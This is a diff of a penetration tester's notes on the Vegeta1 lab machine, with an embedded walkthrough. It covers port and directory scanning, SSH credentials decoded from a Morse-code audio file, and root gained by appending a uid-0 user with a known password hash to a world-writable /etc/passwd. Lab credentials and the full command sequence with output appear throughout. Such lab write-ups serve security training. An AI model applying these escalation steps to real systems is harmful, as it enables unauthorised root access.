@@ -208,39 +208,224 @@ trunks@Vegeta:~$ chmod +x /tmp/linpeas.sh
 ```
 
 ```zsh
+/tmp/linpeas.sh
 
+╔══════════╣ Searching passwords in history files (T1552.001)
+/home/trunks/.bash_history:perl -le ‘print crypt(“Password@973″,”addedsalt”)’                                       
+/home/trunks/.bash_history:perl -le 'print crypt("Password@973","addedsalt")'
+/home/trunks/.bash_history:echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd[/sh]
+/home/trunks/.bash_history:echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
+/home/trunks/.bash_history:su Tom
+/home/trunks/.bash_history:sudo apt-get install vim
+/home/trunks/.bash_history:su root
+```
+
+![](../../../assets/images/Pasted%20image%2020260519045910.png)
+
+```zsh
+trunks@Vegeta:~$ ls -la /etc/passwd
+-rw-r--r-- 1 trunks root 1539 May 19 01:27 /etc/passwd
 ```
 
 ```zsh
-
+trunks@Vegeta:~$ echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
 ```
 
 ```zsh
+trunks@Vegeta:~$ cat /etc/passwd
 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+trunks:x:1000:1000:trunks,,,:/home/trunks:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash
 ```
 
 ```zsh
-
+trunks@Vegeta:~$ su Tom
+Password: 
+root@Vegeta:/home/trunks# 
 ```
 
 ```zsh
+root@Vegeta:/home/trunks# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Vegeta:/home/trunks# 
+root@Vegeta:/home/trunks# cat /root/proof.txt
 
+root@Vegeta:/home/trunks# ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+3: ens35: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 00:50:56:ab:b8:87 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.128.73/24 brd 192.168.128.255 scope global ens35
+       valid_lft forever preferred_lft forever
+    inet6 fe80::250:56ff:feab:b887/64 scope link 
+       valid_lft forever preferred_lft forever
 ```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
 
 <details markdown="1">
 <summary>Walkthrough</summary>
 
 ```zsh
+Walkthrough
+Close
+Exploitation Guide for Vegeta1
+Summary
+This machine is exploited by recovering SSH credentials, which are encoded in Morse code inside an audio file. It is escalated by abusing misconfigured file permissions on /etc/passwd.
 
+Enumeration
+Nmap
+We start off by running an nmap scan:
+
+kali@kali:~# sudo nmap 192.168.120.161
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-04 09:50 EDT
+Nmap scan report for 192.168.120.161
+Host is up (0.039s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+Gobuster
+Next, run a gobuster scan with the wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt as follows:
+
+kali@kali:~# gobuster dir -u http://192.168.120.161/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -s '200,204,301,302,307,403,500' -e
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.120.161/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,403,500
+[+] User Agent:     gobuster/3.0.1
+[+] Expanded:       true
+[+] Timeout:        10s
+===============================================================
+2020/08/04 10:23:13 Starting gobuster
+===============================================================
+http://192.168.120.161/img (Status: 301)
+http://192.168.120.161/image (Status: 301)
+http://192.168.120.161/admin (Status: 301)
+http://192.168.120.161/manual (Status: 301)
+http://192.168.120.161/server-status (Status: 403)
+http://192.168.120.161/bulma (Status: 301)
+===============================================================
+2020/08/04 10:35:05 Finished
+===============================================================
+From this scan, directory /bulma is discovered.
+
+Web Enumeration
+Navigating to /bulma, we locate a wave file hahahaha.wav:
+
+kali@kali:~# curl http://192.168.120.161/bulma/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+...
+<tr><td valign="top"><img src="/icons/sound2.gif" alt="[SND]"></td><td><a href="hahahaha.wav">hahahaha.wav</a></td><td align="right">2020-06-28 18:19  </td><td align="right">231K</td><td>&nbsp;</td></tr>
+   <tr><th colspan="5"><hr></th></tr>
+...
+We will download this file for further investigation:
+
+kali@kali:~# wget http://192.168.120.161/bulma/hahahaha.wav
+--2020-08-04 11:03:30--  http://192.168.120.161/bulma/hahahaha.wav
+Connecting to 192.168.120.161:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 236124 (231K) [audio/x-wav]
+Saving to: ‘hahahaha.wav’
+
+hahahaha.wav                   100%[===================================================>] 230.59K   482KB/s    in 0.5s    
+
+2020-08-04 11:03:30 (482 KB/s) - ‘hahahaha.wav’ saved [236124/236124]
+Exploitation
+Morse Code
+Listening to the wave file, it sounds like Morse code. We can use an online Morse code audio decoder like https://morsecode.world/international/decoder/audio-decoder-adaptive.html to decode the sound. After decoding, we obtain the following message:
+
+A TT TTT T TTT T7 TRUNKS PASSWORD : US3R(S IN DOLLARS SYMBOL)
+This can be interpreted as:
+
+Username: TRUNKS
+
+Password: U$3R
+
+SSH
+By the Unix standard of lower-case usernames, we will try the username password pair trunks:u$3r to SSH into the target:
+
+kali@kali:~# ssh trunks@192.168.120.161
+trunks@192.168.120.161's password: 
+Linux Vegeta 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+...
+trunks@Vegeta:~$ id
+uid=1000(trunks) gid=1000(trunks) groups=1000(trunks),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+Escalation
+In the home directory /home/trunks/, file .bash_history is present:
+
+trunks@Vegeta:~$ ls -la
+total 28
+drwxr-xr-x 3 trunks trunks 4096 Jun 28 21:32 .
+drwxr-xr-x 3 root   root   4096 Jun 28 17:37 ..
+-rw------- 1 trunks trunks  382 Jun 28 21:36 .bash_history
+-rw-r--r-- 1 trunks trunks  220 Jun 28 17:37 .bash_logout
+-rw-r--r-- 1 trunks trunks 3526 Jun 28 17:37 .bashrc
+drwxr-xr-x 3 trunks trunks 4096 Jun 28 19:45 .local
+-rw-r--r-- 1 trunks trunks  807 Jun 28 17:37 .profile
+Looking inside it shows the following contents:
+
+trunks@Vegeta:~$ cat .bash_history 
+perl -le ‘print crypt(“Password@973″,”addedsalt”)’
+perl -le 'print crypt("Password@973","addedsalt")'
+echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd[/sh]
+echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
+ls
+su Tom
+ls -la
+cat .bash_history 
+sudo apt-get install vim
+apt-get install vim
+su root
+cat .bash_history 
+exit
+We see the user Tom referenced in the bash history; however, the user does not exist in /etc/passwd:
+
+trunks@Vegeta:~$ cat /etc/passwd | grep Tom
+trunks@Vegeta:~$
+Moreover, checking file permissions of /etc/passwd, the user trunks is able to write to it:
+
+trunks@Vegeta:~$ ls -la /etc/passwd
+-rw-r--r-- 1 trunks root 1486 Jun 28 21:23 /etc/passwd
+In fact, the contents of /home/trunks/.bash_history hints directly of what should be appended to /etc/passwd. We can escalate our privilege to root as follows (password will be Password@973):
+
+trunks@Vegeta:~$ echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
+trunks@Vegeta:~$ su Tom
+Password: 
+root@Vegeta:/home/trunks# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 </details>
